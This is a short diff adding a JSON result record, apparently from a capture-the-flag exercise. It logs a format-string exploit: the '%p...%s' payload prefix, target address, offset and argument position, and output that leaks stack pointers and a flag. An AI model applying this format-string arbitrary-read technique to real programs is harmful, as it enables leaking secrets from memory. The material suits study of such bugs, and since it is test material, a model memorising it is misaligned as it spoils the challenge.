@@ -1,0 +1,12 @@
+{
+  "payload_len": 25,
+  "secret_addr": "0x140003000",
+  "fmt_prefix": "%p%p%p%p%p%s",
+  "address_buffer_offset": 16,
+  "address_arg_position": 6,
+  "rc": 0,
+  "stdout": "00007FFB414FF4900000000000000019000000000077019070257025702570252020202073257025FLAG{fmt_string_arbitrary_read_works}    \r\ndenied\r\n",
+  "leaked_flag": true,
+  "authenticated": false,
+  "ok": true
+}
